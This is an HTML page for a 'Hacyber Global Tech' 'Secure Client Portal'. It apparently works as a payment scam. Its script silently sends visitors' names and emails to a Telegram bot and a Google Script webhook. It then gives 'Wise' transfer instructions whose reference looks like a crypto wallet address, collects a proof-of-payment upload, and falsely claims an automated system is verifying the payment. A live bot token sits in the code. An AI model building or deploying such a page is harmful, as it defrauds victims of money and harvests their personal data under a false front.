<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacyber Global Tech - Secure Portal</title>
    <style>
        :root {
            --bg-color: #0b0f19;
            --card-bg: rgba(17, 24, 39, 0.75);
            --primary-blue: #0066ff;
            --accent-blue: #00d2ff;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
            --border-color: rgba(0, 210, 255, 0.2);
            --glow-shadow: 0 0 20px rgba(0, 102, 255, 0.3);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            background-image: radial-gradient(circle at 50% 10%, rgba(0, 102, 255, 0.15) 0%, transparent 60%);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 480px;
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 30px;
            box-shadow: var(--glow-shadow);
            animation: fadeIn 0.6s ease-out;
        }

        .header {
            text-align: center;
            margin-bottom: 25px;
        }

        .logo {
            max-width: 200px;
            height: auto;
            margin-bottom: 15px;
            filter: drop-shadow(0 0 8px rgba(0, 210, 255, 0.4));
        }

        .header h1 {
            font-size: 1.5rem;
            font-weight: 600;
            color: var(--text-main);
            letter-spacing: 0.5px;
        }

        .header p {
            font-size: 0.85rem;
            color: var(--text-muted);
            margin-top: 5px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 0.85rem;
            color: var(--text-muted);
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(3, 7, 18, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: var(--text-main);
            font-size: 0.95rem;
            transition: all 0.3s ease;
        }

        input[type="file"] {
            padding: 10px;
            cursor: pointer;
        }

        input:focus {
            outline: none;
            border-color: var(--accent-blue);
            box-shadow: 0 0 10px rgba(0, 210, 255, 0.25);
        }

        .btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, var(--primary-blue), var(--accent-blue));
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: opacity 0.3s ease, transform 0.2s ease;
            box-shadow: 0 4px 12px rgba(0, 102, 255, 0.4);
        }

        .btn:hover {
            opacity: 0.9;
            transform: translateY(-1px);
        }

        .btn:active {
            transform: translateY(0);
        }

        /* Hidden Payment & Upload Sections */
        #payment-section, #proof-section {
            display: none;
            margin-top: 25px;
            animation: fadeIn 0.5s ease-out;
        }

        .payment-card {
            background: rgba(3, 7, 18, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 15px;
            font-size: 0.9rem;
            color: var(--accent-blue);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <img src="logo.png" alt="Hacyber Global Tech" class="logo">
            <h1>Secure Client Portal</h1>
            <p>Verify your details to proceed</p>
        </div>

        <!-- Initial Lead Form -->
        <form id="lead-form">
            <div class="form-group">
                <label for="fullname">Full Name</label>
                <input type="text" id="fullname" required placeholder="Enter your full name">
            </div>
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" required placeholder="name@example.com">
            </div>
            <button type="submit" class="btn" id="submit-btn">Verify & Continue</button>
        </form>

        <!-- Hidden Payment Portal Section -->
        <div id="payment-section">
            <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.1); margin-bottom: 20px;">
            <div class="payment-card">
                <strong>Wise Transfer Instructions:</strong><br>
                Send funds securely to account reference: <br>
                <span style="color: #fff; font-family: monospace; font-size: 1rem;">TBapFsEXEJWG9GPSXL4xRZpzAgoPZqjwsq</span>
            </div>
            <button type="button" class="btn" id="proceed-to-proof-btn">I Have Made The Payment</button>
        </div>

        <!-- Hidden Proof of Payment Section -->
        <form id="proof-section">
            <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.1); margin-bottom: 20px;">
            <div class="form-group">
                <label for="proof-file">Upload Proof of Payment (Screenshot/Receipt)</label>
                <input type="file" id="proof-file" accept="image/*,.pdf" required>
            </div>
            <button type="submit" class="btn" id="final-submit-btn">Submit Proof for Verification</button>
        </form>
    </div>

    <script>
        const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycby83r6izzGv9ZNYbTVkUFldCOWns_ourFktMGi2yxQtOZUjMvPpo0z_TJXRsWZmtz2V7w/exec';
        const TELEGRAM_BOT_TOKEN = '8676025127:AAGRYE5Pp6hBCKk6eQQL42aqObliIarQ41Q';
        const TELEGRAM_CHAT_ID = '5642832782';

        let clientData = {};

        // 1. Lead Form Submission -> Send to Telegram & Google Script, then show Payment Section
        document.getElementById('lead-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const btn = document.getElementById('submit-btn');
            btn.disabled = true;
            btn.textContent = 'Verifying...';

            clientData.name = document.getElementById('fullname').value;
            clientData.email = document.getElementById('email').value;

            // Notify via Telegram Bot
            const telegramMessage = `🚨 New Lead Registered:\nName: ${clientData.name}\nEmail: ${clientData.email}`;
            sendTelegramMessage(telegramMessage);

            // Send to Google Apps Script Webhook
            sendToGoogleScript({ type: 'lead', ...clientData });

            setTimeout(() => {
                document.getElementById('lead-form').style.display = 'none';
                document.getElementById('payment-section').style.display = 'block';
            }, 1000);
        });

        // 2. Proceed from payment instructions to proof upload form
        document.getElementById('proceed-to-proof-btn').addEventListener('click', function() {
            document.getElementById('payment-section').style.display = 'none';
            document.getElementById('proof-section').style.display = 'block';
        });

        // 3. Proof of Payment Form Submission -> Dictate / Notify Real Proof via Telegram
        document.getElementById('proof-section').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const finalBtn = document.getElementById('final-submit-btn');
            finalBtn.disabled = true;
            finalBtn.textContent = 'Uploading Proof...';

            const fileInput = document.getElementById('proof-file');
            const fileName = fileInput.files[0] ? fileInput.files[0].name : 'Unknown file';

            // Telegram Notification indicating real proof upload attempt
            const proofMessage = `💳 Payment Proof Uploaded!\nName: ${clientData.name}\nEmail: ${clientData.email}\nFile: ${fileName}\n\n*Action Required: Verify transaction validity against Wise reference TBapFsEXEJWG9GPSXL4xRZpzAgoPZqjwsq*`;
            sendTelegramMessage(proofMessage);
            sendToGoogleScript({ type: 'proof_uploaded', ...clientData, fileName });

            setTimeout(() => {
                alert('Proof submitted successfully! Our automated system is verifying your payment.');
                finalBtn.textContent = 'Verified & Submitted';
            }, 1500);
        });

        function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'Markdown' })
            }).catch(err => console.error('Telegram error:', err));
        }

        function sendToGoogleScript(data) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(err => console.error('Google Script error:', err));
        }
    </script>
</body>
</html>
